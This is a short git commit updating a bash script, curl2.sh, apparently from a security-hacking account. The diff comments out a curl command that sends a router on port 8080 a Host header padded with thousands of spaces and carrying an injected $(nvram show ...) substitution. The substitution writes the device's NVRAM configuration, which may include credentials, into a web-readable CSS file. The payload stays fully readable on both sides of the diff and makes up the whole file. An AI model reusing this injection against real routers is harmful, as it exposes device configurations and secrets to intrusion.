f3ffb8351f777fd9fb5471a42b539a158b9b9955
hackingyseguridad <hackingyseguridad@hackingyseguridad.com>
2018-10-20 16:20:51 +0200

    Update curl2.sh

--- curl2.sh
+++ curl2.sh
@@ -1,2 +1,4 @@
 #!/bin/bash
-curl 'http://routerIP:8080' -H "Host: xxxxxxxxxxxxxx $(for i in $(seq 1 9700); do echo -n " "; done)  \$(nvram show > /www/user/nvram.css )"
+#curl 'http://routerIP:8080' -H "Host: xxxxxxxxxxxxxx $(for i in $(seq 1 9700); do echo -n " "; done)  \$(nvram show > /www/user/nvram.css )"
+
+
